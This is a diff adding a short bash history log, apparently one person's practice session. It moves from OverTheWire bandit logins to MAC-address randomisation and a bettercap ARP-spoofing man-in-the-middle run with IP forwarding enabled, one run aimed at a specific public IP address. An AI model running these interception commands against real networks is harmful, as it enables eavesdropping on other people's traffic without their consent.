@@ -1,0 +1,50 @@
+ 1625  ls
+ 1626  cat wifi_hacking
+ 1627  rm wifi_hacking
+ 1628  touch wifi_hack.txt
+ 1629  sudo nano wifi_hack.txt
+ 1630  ssh bandit12@bandit.labs.overthewire.org -p 2220
+ 1631  nmcli connection show
+ 1632  nmcli connection delete id "Oliver 99"
+ 1633  nmcli connection delete id "Airtel 4G MiFi
+ 1634  exit;
+ 1635  \q
+ 1636  nmcli connection show
+ 1637  nmcli connection delete id "Oliver 99"
+ 1638  ls
+ 1639  nano password.txt
+ 1640  cd Documents
+ 1641  ls
+ 1642  nano bandit password.txt
+ 1643  rm banditpassword.txt
+ 1644  nano banditpw.txt
+ 1645  ssh bandit12@bandit.labs.overthewire.org -p 2220
+ 1646  cd Documents
+ 1647  ls
+ 1648  nano banditpw.txt
+ 1649  sudo apt upgrade
+ 1650  sudo iwconfig
+ 1651  sudo ifconfig wlo1 down
+ 1652  sudo macchanger -r wlo1 
+ 1653  sudo ifconfig wlo1 up
+ 1654  sudo bettercap
+ 1655  sudo apt upgrade bettercap
+ 1656  sudo bettercap
+ 1657  ifconfig
+ 1658  sudo ifconfig 
+ 1659  sudo usermod -aG wireshark $USER
+ 1660  wireshark
+ 1661  sudo apt update
+ 1662  sudo ifconfig
+ 1663  sudo iwconfig
+ 1664  wireshark
+ 1665  sudo usermod -aG wireshark
+ 1666  wireshark
+ 1667  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+ 1668  sudo bettercap -eval "net.probe on; set arp.spoof.targets [target IP]; arp.spoof on"
+ 1669  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+ 1670  sudo bettercap -eval "net.probe on; set arp.spoof.targets 44.228.249.3; arp.spoof on"
+ 1671  arp.spoof off
+ 1672  echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
+ 1673  history
+ 1674  history | tail -n 50 > MITM_recent_commands.txt
